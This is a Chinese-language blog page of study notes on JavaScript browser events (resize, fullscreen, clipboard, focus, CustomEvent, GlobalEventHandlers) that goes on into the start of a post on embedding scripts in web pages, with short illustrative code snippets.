<h4 id="4-2-resize-事件（窗口大小变化时触发）"><a href="#4-2-resize-事件（窗口大小变化时触发）" class="headerlink" title="4.2 resize 事件（窗口大小变化时触发）"></a>4.2 resize 事件（窗口大小变化时触发）</h4><p><code>resize</code>事件<strong>在改变浏览器窗口大小时触发</strong>，主要<strong>发生在<code>window</code>对象上面</strong>。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> resizeMethod = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="variable language_">document</span>.<span class="property">body</span>.<span class="property">clientWidth</span> &lt; <span class="number">768</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;移动设备的视口&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">window</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;resize&#x27;</span>, resizeMethod, <span class="literal">true</span>);</span><br></pre></td></tr></table></figure>

<p>该事件也会连续地大量触发，所以最好像上面的<code>scroll</code>事件一样，通过<code>throttle</code>函数控制事件触发频率。</p>
<h4 id="4-3-fullscreenchange-事件（元素进入-退出全屏时触发），fullscreenerror-事件（无法切换全屏时触发）"><a href="#4-3-fullscreenchange-事件（元素进入-退出全屏时触发），fullscreenerror-事件（无法切换全屏时触发）" class="headerlink" title="4.3 fullscreenchange 事件（元素进入&#x2F;退出全屏时触发），fullscreenerror 事件（无法切换全屏时触发）"></a>4.3 fullscreenchange 事件（元素进入&#x2F;退出全屏时触发），fullscreenerror 事件（无法切换全屏时触发）</h4><p><code>fullscreenchange</code>事件<strong>在元素进入或退出全屏状态时触发</strong>，该事件<strong>发生在<code>document</code>对象上面</strong>。</p>
<p><strong>注意，此事件非浏览器的进入&#x2F;退出全屏时触发的事件。</strong></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;fullscreenchange&#x27;</span>, <span class="keyword">function</span> (<span class="params">event</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">document</span>.<span class="property">fullscreenElement</span>); <span class="comment">// 全屏的元素，如果为null时表示已退出全屏</span></span><br><span class="line">&#125;);</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, <span class="keyword">function</span> (<span class="params">event</span>) &#123;</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;div&#x27;</span>).<span class="title function_">requestFullscreen</span>(); <span class="comment">// 设置元素为全屏展示</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p><code>fullscreenerror</code>事件在<strong>浏览器无法切换到全屏状态时触发</strong>。</p>
<h3 id="5、剪贴板事件"><a href="#5、剪贴板事件" class="headerlink" title="5、剪贴板事件"></a>5、剪贴板事件</h3><p>以下三个事件属于剪贴板操作的相关事件。</p>
<ul>
<li><code>cut</code>：将选中的内容从文档中移除，加入剪贴板时触发。<strong>【剪切】</strong></li>
<li><code>copy</code>：进行复制动作时触发。<strong>【拷贝】</strong></li>
<li><code>paste</code>：剪贴板内容粘贴到文档后触发。<strong>【粘贴】</strong></li>
</ul>
<p>这三个事件都是**<code>ClipboardEvent</code>接口的实例**。<code>ClipboardEvent</code>有一个实例属性<code>clipboardData</code>，是一个 DataTransfer 对象，存放剪贴的数据。具体的 API 接口和操作方法，请参见《拖拉事件》的 DataTransfer 对象部分。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;copy&#x27;</span>, <span class="keyword">function</span> (<span class="params">e</span>) &#123;</span><br><span class="line">  e.<span class="property">clipboardData</span>.<span class="title function_">setData</span>(<span class="string">&#x27;text/plain&#x27;</span>, <span class="string">&#x27;Hello, world!&#x27;</span>);</span><br><span class="line">  e.<span class="property">clipboardData</span>.<span class="title function_">setData</span>(<span class="string">&#x27;text/html&#x27;</span>, <span class="string">&#x27;&lt;b&gt;Hello, world!&lt;/b&gt;&#x27;</span>);</span><br><span class="line">  e.<span class="title function_">preventDefault</span>();</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>上面的代码使得复制进入剪贴板的，都是开发者指定的数据，而不是用户想要拷贝的数据。</p>
<h3 id="6、焦点事件"><a href="#6、焦点事件" class="headerlink" title="6、焦点事件"></a>6、焦点事件</h3><p>焦点事件发生在元素节点和<code>document</code>对象上面，与获得或失去焦点相关。它主要包括以下四个事件。</p>
<ul>
<li><code>focus</code>：元素节点<strong>获得焦点</strong>后触发，该事件不会冒泡。</li>
<li><code>blur</code>：元素节点<strong>失去焦点</strong>后触发，该事件不会冒泡。</li>
<li><code>focusin</code>：元素节点<strong>将要获得焦点</strong>时触发，发生在<code>focus</code>事件之前。该事件会冒泡。</li>
<li><code>focusout</code>：元素节点<strong>将要失去焦点</strong>时触发，发生在<code>blur</code>事件之前。该事件会冒泡。</li>
</ul>
<p>这四个事件都继承了<code>FocusEvent</code>接口。<code>FocusEvent</code>实例具有以下属性。</p>
<ul>
<li><code>FocusEvent.target</code>：事件的目标节点。</li>
<li><code>FocusEvent.relatedTarget</code>：对于<code>focusin</code>事件，返回失去焦点的节点；对于<code>focusout</code>事件，返回将要接受焦点的节点；对于<code>focus</code>和<code>blur</code>事件，返回<code>null</code>。</li>
</ul>
<p>由于<code>focus</code>和<code>blur</code>事件不会冒泡，只能在捕获阶段触发，所以<code>addEventListener</code>方法的第三个参数需要设为<code>true</code>。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">form.<span class="title function_">addEventListener</span>(<span class="string">&#x27;focus&#x27;</span>, <span class="keyword">function</span> (<span class="params">event</span>) &#123;</span><br><span class="line">  event.<span class="property">target</span>.<span class="property">style</span>.<span class="property">background</span> = <span class="string">&#x27;pink&#x27;</span>;</span><br><span class="line">&#125;, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">form.<span class="title function_">addEventListener</span>(<span class="string">&#x27;blur&#x27;</span>, <span class="keyword">function</span> (<span class="params">event</span>) &#123;</span><br><span class="line">  event.<span class="property">target</span>.<span class="property">style</span>.<span class="property">background</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">&#125;, <span class="literal">true</span>);</span><br></pre></td></tr></table></figure>

<p>上面代码针对表单的文本输入框，接受焦点时设置背景色，失去焦点时去除背景色。</p>
<h3 id="7、CustomEvent-接口（自定义事件）"><a href="#7、CustomEvent-接口（自定义事件）" class="headerlink" title="7、CustomEvent 接口（自定义事件）"></a>7、CustomEvent 接口（自定义事件）</h3><p>CustomEvent 接口<strong>用于生成自定义的事件实例</strong>。那些浏览器预定义的事件，虽然可以手动生成，但是往往不能在事件上绑定数据。如果需要在触发事件的同时，传入指定的数据，就可以使用 CustomEvent 接口生成的自定义事件对象。</p>
<p>浏览器原生提供<code>CustomEvent()</code>构造函数，用来生成 CustomEvent 事件实例。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">CustomEvent</span>(type, options)</span><br></pre></td></tr></table></figure>

<p><code>CustomEvent()</code>构造函数接受两个参数。第一个参数是字符串，表示事件的名字，这是必须的。第二个参数是事件的配置对象，这个参数是可选的。<code>CustomEvent</code>的配置对象除了接受 Event 事件的配置属性，只有一个自己的属性。</p>
<ul>
<li><code>detail</code>：表示事件的附带数据，默认为<code>null</code>。</li>
</ul>
<p>下面是一个例子。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> event = <span class="keyword">new</span> <span class="title class_">CustomEvent</span>(<span class="string">&#x27;build&#x27;</span>, &#123; <span class="string">&#x27;detail&#x27;</span>: <span class="string">&#x27;hello&#x27;</span> &#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">eventHandler</span>(<span class="params">e</span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(e.<span class="property">detail</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;build&#x27;</span>, <span class="keyword">function</span> (<span class="params">e</span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(e.<span class="property">detail</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">dispatchEvent</span>(event);</span><br></pre></td></tr></table></figure>

<p>上面代码中，我们手动定义了<code>build</code>事件。该事件触发后，会被监听到，从而输出该事件实例的<code>detail</code>属性（即字符串<code>hello</code>）。</p>
<p>下面是另一个例子。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> myEvent = <span class="keyword">new</span> <span class="title class_">CustomEvent</span>(<span class="string">&#x27;myevent&#x27;</span>, &#123;</span><br><span class="line">  <span class="attr">detail</span>: &#123;</span><br><span class="line">    <span class="attr">foo</span>: <span class="string">&#x27;bar&#x27;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">bubbles</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="attr">cancelable</span>: <span class="literal">false</span></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">el.<span class="title function_">addEventListener</span>(<span class="string">&#x27;myevent&#x27;</span>, <span class="keyword">function</span> (<span class="params">event</span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Hello &#x27;</span> + event.<span class="property">detail</span>.<span class="property">foo</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">el.<span class="title function_">dispatchEvent</span>(myEvent);</span><br></pre></td></tr></table></figure>

<p>上面代码也说明，CustomEvent 的事件实例，除了具有 Event 接口的实例属性，还具有<code>detail</code>属性。</p>
<h2 id="十一、GlobalEventHandlers-接口-（全局事件处理接口）"><a href="#十一、GlobalEventHandlers-接口-（全局事件处理接口）" class="headerlink" title="十一、GlobalEventHandlers 接口 （全局事件处理接口）"></a>十一、GlobalEventHandlers 接口 （全局事件处理接口）</h2><p>指定事件的回调函数，推荐使用的方法是元素的<code>addEventListener</code>方法。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">div.<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, clickHandler, <span class="literal">false</span>);</span><br></pre></td></tr></table></figure>

<p>除了之外，还有一种方法可以直接指定事件的回调函数。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">div.<span class="property">onclick</span> = clickHandler;</span><br></pre></td></tr></table></figure>

<p>这个接口是由<code>GlobalEventHandlers</code>接口提供的。它的优点是使用比较方便，缺点是只能为每个事件指定一个回调函数，并且无法指定事件触发的阶段（捕获阶段还是冒泡阶段）。</p>
<p><strong><code>HTMLElement</code>、<code>Document</code>和<code>Window</code>都继承了这个接口，也就是说，各种 HTML 元素、<code>document</code>对象、<code>window</code>对象上面都可以使用<code>GlobalEventHandlers</code>接口提供的属性</strong>。下面就列出这个接口提供的主要的事件属性。</p>
<h3 id="1、GlobalEventHandlers-onabort-（中断事件）"><a href="#1、GlobalEventHandlers-onabort-（中断事件）" class="headerlink" title="1、GlobalEventHandlers.onabort （中断事件）"></a>1、GlobalEventHandlers.onabort （中断事件）</h3><p>某个对象的<code>abort</code>事件（停止加载）发生时，就会调用<code>onabort</code>属性指定的回调函数。</p>
<p>各种元素的停止加载事件，到底如何触发，目前并没有统一的规定。因此实际上，这个属性现在一般只用在<code>&lt;img&gt;</code>元素上面。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// HTML 代码如下</span></span><br><span class="line"><span class="comment">// &lt;img src=&quot;example.jpg&quot; id=&quot;img&quot;&gt;</span></span><br><span class="line"><span class="keyword">var</span> img = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;img&#x27;</span>);</span><br><span class="line">img.<span class="property">onabort</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;图片加载中断&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="2、GlobalEventHandlers-onerror-（错误事件）"><a href="#2、GlobalEventHandlers-onerror-（错误事件）" class="headerlink" title="2、GlobalEventHandlers.onerror （错误事件）"></a>2、GlobalEventHandlers.onerror （错误事件）</h3><p><code>error</code>事件发生时，就会调用<code>onerror</code>属性指定的回调函数。</p>
<p><code>error</code>事件<strong>分成两种</strong>。</p>
<p><strong>一种是 JavaScript 的运行时错误</strong>，这会传到<code>window</code>对象，导致<code>window.onerror()</code>。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="property">onerror</span> = <span class="keyword">function</span> (<span class="params">message, source, lineno, colno, error</span>) &#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>window.onerror</code>的处理函数共接受五个参数，含义如下。</p>
<ul>
<li>message：错误信息字符串</li>
<li>source：报错脚本的 URL</li>
<li>lineno：报错的行号，是一个整数</li>
<li>colno：报错的列号，是一个整数</li>
<li>error： 错误对象</li>
</ul>
<p>另<strong>一种是资源加载错误</strong>，比如<code> &lt;img&gt; </code>或<code> &lt;script&gt; </code>加载的资源出现加载错误。这时，Error 对象会传到对应的元素，导致该元素的<code>onerror</code>属性开始执行。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">element.<span class="property">onerror</span> = <span class="keyword">function</span> (<span class="params">event</span>) &#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>注意，一般来说，资源的加载错误不会触发<code>window.onerror</code>。</p>
<h3 id="3、GlobalEventHandlers-onload（加载完成事件）、GlobalEventHandlers-onloadstart（开始加载事件）"><a href="#3、GlobalEventHandlers-onload（加载完成事件）、GlobalEventHandlers-onloadstart（开始加载事件）" class="headerlink" title="3、GlobalEventHandlers.onload（加载完成事件）、GlobalEventHandlers.onloadstart（开始加载事件）"></a>3、GlobalEventHandlers.onload（加载完成事件）、GlobalEventHandlers.onloadstart（开始加载事件）</h3><p>元素完成加载时，会触发<code>load</code>事件，执行<code>onload()</code>。它的典型使用场景是<code>window</code>对象和<code> &lt;img&gt; </code>元素。对于<code>window</code>对象来说，只有页面的所有资源加载完成（包括图片、脚本、样式表、字体等所有外部资源），才会触发<code>load</code>事件。</p>
<p>对于<code> &lt;img&gt; </code>和<code> &lt;video&gt; </code>等元素，加载开始时还会触发<code>loadstart</code>事件，导致执行<code>onloadstart</code>。</p>
<h3 id="4、GlobalEventHandlers-onfocus（获取焦点事件），GlobalEventHandlers-onblur（失去焦点事件）"><a href="#4、GlobalEventHandlers-onfocus（获取焦点事件），GlobalEventHandlers-onblur（失去焦点事件）" class="headerlink" title="4、GlobalEventHandlers.onfocus（获取焦点事件），GlobalEventHandlers.onblur（失去焦点事件）"></a>4、GlobalEventHandlers.onfocus（获取焦点事件），GlobalEventHandlers.onblur（失去焦点事件）</h3><p>当前元素获得焦点时，会触发<code>element.onfocus</code>；失去焦点时，会触发<code>element.onblur</code>。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">element.<span class="property">onfocus</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;onfocus event detected!&quot;</span>);</span><br><span class="line">&#125;;</span><br><span class="line">element.<span class="property">onblur</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;onblur event detected!&quot;</span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>注意，如果不是可以接受用户输入的元素，要触发<code>onfocus</code>，该元素必须有<code>tabindex</code>属性。</p>
<h3 id="5、GlobalEventHandlers-onscroll（滚动事件）"><a href="#5、GlobalEventHandlers-onscroll（滚动事件）" class="headerlink" title="5、GlobalEventHandlers.onscroll（滚动事件）"></a>5、GlobalEventHandlers.onscroll（滚动事件）</h3><p>页面或元素滚动时，会触发<code>scroll</code>事件，导致执行<code>onscroll()</code>。</p>
<h3 id="6、GlobalEventHandlers-oncontextmenu（右键菜单事件），GlobalEventHandlers-onshow（显示右键菜单时触发）"><a href="#6、GlobalEventHandlers-oncontextmenu（右键菜单事件），GlobalEventHandlers-onshow（显示右键菜单时触发）" class="headerlink" title="6、GlobalEventHandlers.oncontextmenu（右键菜单事件），GlobalEventHandlers.onshow（显示右键菜单时触发）"></a>6、GlobalEventHandlers.oncontextmenu（右键菜单事件），GlobalEventHandlers.onshow（显示右键菜单时触发）</h3><p>用户在页面上按下鼠标的右键，会触发<code>contextmenu</code>事件，导致执行<code>oncontextmenu()</code>。如果该属性执行后返回<code>false</code>，就等于禁止了右键菜单。<code>document.oncontextmenu</code>与<code>window.oncontextmenu</code>效果一样。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="property">oncontextmenu</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;<span class="comment">// 禁用右键菜单</span></span><br><span class="line">  <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>上面代码中，<code>oncontextmenu</code>属性执行后返回<code>false</code>，右键菜单就不会出现。</p>
<p>元素的右键菜单显示时，会触发该元素的<code>onshow</code>监听函数。</p>
<h3 id="7、其他的事件属性"><a href="#7、其他的事件属性" class="headerlink" title="7、其他的事件属性"></a>7、其他的事件属性</h3><p>鼠标的事件属性。</p>
<ul>
<li>onclick</li>
<li>ondblclick</li>
<li>onmousedown</li>
<li>onmouseenter</li>
<li>onmouseleave</li>
<li>onmousemove</li>
<li>onmouseout</li>
<li>onmouseover</li>
<li>onmouseup</li>
<li>onwheel</li>
</ul>
<p>键盘的事件属性。</p>
<ul>
<li>onkeydown</li>
<li>onkeypress</li>
<li>onkeyup</li>
</ul>
<p>焦点的事件属性。</p>
<ul>
<li>onblur</li>
<li>onfocus</li>
</ul>
<p>表单的事件属性。</p>
<ul>
<li>oninput</li>
<li>onchange</li>
<li>onsubmit</li>
<li>onreset</li>
<li>oninvalid</li>
<li>onselect</li>
</ul>
<p>触摸的事件属性。</p>
<ul>
<li>ontouchcancel</li>
<li>ontouchend</li>
<li>ontouchmove</li>
<li>ontouchstart</li>
</ul>
<p>拖动的事件属性分成两类：一类与被拖动元素相关，另一类与接收被拖动元素的容器元素相关。</p>
<p>被拖动元素的事件属性。</p>
<ul>
<li>ondragstart：拖动开始</li>
<li>ondrag：拖动过程中，每隔几百毫秒触发一次</li>
<li>ondragend：拖动结束</li>
</ul>
<p>接收被拖动元素的容器元素的事件属性。</p>
<ul>
<li>ondragenter：被拖动元素进入容器元素。</li>
<li>ondragleave：被拖动元素离开容器元素。</li>
<li>ondragover：被拖动元素在容器元素上方，每隔几百毫秒触发一次。</li>
<li>ondrop：松开鼠标后，被拖动元素放入容器元素。</li>
</ul>
<p><code>&lt;dialog&gt;</code>对话框元素的事件属性。</p>
<ul>
<li>oncancel</li>
<li>onclose</li>
</ul>
<h2 id="文档"><a href="#文档" class="headerlink" title="文档"></a>文档</h2><p>学习文档：<a target="_blank" rel="noopener" href="https://wangdoc.com/javascript/">https://wangdoc.com/javascript/</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/pages/10b2761db5a8e089" data-id="cm2n1iut1000s9sr3c6qc5ai0" data-title="事件" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-07.浏览器模型" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/pages/bab4930124ad2c10" class="article-date">
  <time class="dt-published" datetime="2020-01-12T03:49:16.000Z" itemprop="datePublished">2020-01-12</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E3%80%8AJavaScript%E6%95%99%E7%A8%8B%E3%80%8B%E7%AC%94%E8%AE%B0/">《JavaScript教程》笔记</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/pages/bab4930124ad2c10">浏览器模型</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="浏览器模型"><a href="#浏览器模型" class="headerlink" title="浏览器模型"></a>浏览器模型</h1><h2 id="一、浏览器环境概述"><a href="#一、浏览器环境概述" class="headerlink" title="一、浏览器环境概述"></a>一、浏览器环境概述</h2><p><strong>JavaScript 是浏览器的内置脚本语言</strong>。也就是说，浏览器内置了 JavaScript 引擎，并且提供各种接口，让 JavaScript 脚本可以控制浏览器的各种功能。一旦网页内嵌了 JavaScript 脚本，浏览器加载网页，就会去执行脚本，从而达到操作浏览器的目的，实现网页的各种动态效果。</p>
<p>本章开始介绍浏览器提供的各种 JavaScript 接口。首先，介绍 JavaScript 代码嵌入网页的方法。</p>
<h3 id="1、代码嵌入网页的方法"><a href="#1、代码嵌入网页的方法" class="headerlink" title="1、代码嵌入网页的方法"></a>1、代码嵌入网页的方法</h3><p>网页中嵌入 JavaScript 代码，主要有三种方法。</p>
<ul>
<li><code> &lt;script&gt; </code>元素直接嵌入代码。</li>
<li><code> &lt;script&gt; </code>标签加载外部脚本</li>
<li>事件属性</li>
<li>URL 协议</li>
</ul>
<h4 id="1-1-script-元素嵌入代码"><a href="#1-1-script-元素嵌入代码" class="headerlink" title="1.1 script 元素嵌入代码"></a>1.1 script 元素嵌入代码</h4><p><code> &lt;script&gt; </code>元素内部可以直接写 JavaScript 代码。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">var</span> x = <span class="number">1</span> + <span class="number">5</span>;</span></span><br><span class="line"><span class="language-javascript">  <span class="variable language_">console</span>.<span class="title function_">log</span>(x);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><code> &lt;script&gt; </code>标签有一个type属性，用来指定脚本类型。对 JavaScript 脚本来说，type属性可以设为两种值。</p>
<ul>
<li><code>text/javascript</code>：这是默认值，也是历史上一贯设定的值。如果你省略<code>type</code>属性，默认就是这个值。对于老式浏览器，设为这个值比较好。</li>
<li><code>application/javascript</code>：对于较新的浏览器，建议设为这个值。</li>
</ul>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;application/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Hello World&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>由于<code> &lt;script&gt; </code>标签默认就是 JavaScript 代码。所以，嵌入 JavaScript 脚本时，<code>type</code>属性可以省略。</p>
<p>如果<code>type</code>属性的值，浏览器不认识，那么它不会执行其中的代码。利用这一点，可以在<code> &lt;script&gt; </code>标签之中嵌入任意的文本内容，只要加上一个浏览器不认识的<code>type</code>属性即可。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">id</span>=<span class="string">&quot;mydata&quot;</span> <span class="attr">type</span>=<span class="string">&quot;x-custom-data&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Hello World&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>上面的代码，浏览器不会执行，也不会显示它的内容，因为不认识它的<code>type</code>属性。但是，这个<code> &lt;script&gt; </code>节点依然存在于 DOM 之中，可以使用<code> &lt;script&gt; </code>节点的<code>text</code>属性读出它的内容。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;mydata&#x27;</span>).<span class="property">text</span></span><br><span class="line"><span class="comment">//   console.log(&#x27;Hello World&#x27;);</span></span><br></pre></td></tr></table></figure>



<h4 id="1-2-script-元素加载外部脚本"><a href="#1-2-script-元素加载外部脚本" class="headerlink" title="1.2 script 元素加载外部脚本"></a>1.2 script 元素加载外部脚本</h4><p><code>&lt;script&gt;</code>标签也可以指定加载外部的脚本文件。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://www.example.com/script.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>如果脚本文件使用了非英语字符，还应该注明字符的编码。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span> <span class="attr">src</span>=<span class="string">&quot;https://www.example.com/script.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>所加载的脚本必须是纯的 JavaScript 代码，不能有<code>HTML</code>代码和<code> &lt;script&gt; </code>标签。</p>
<p><strong>加载外部脚本和直接添加代码块，这两种方法不能混用</strong>。下面代码的<code>console.log</code>语句直接被忽略。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span> <span class="attr">src</span>=<span class="string">&quot;example.js&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Hello World!&#x27;</span>); <span class="comment">// 被忽略</span></span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>为了防止攻击者篡改外部脚本，<code>script</code>标签允许设置一个<code>integrity</code>属性，写入该外部脚本的 Hash 签名，用来验证脚本的一致性。</p>
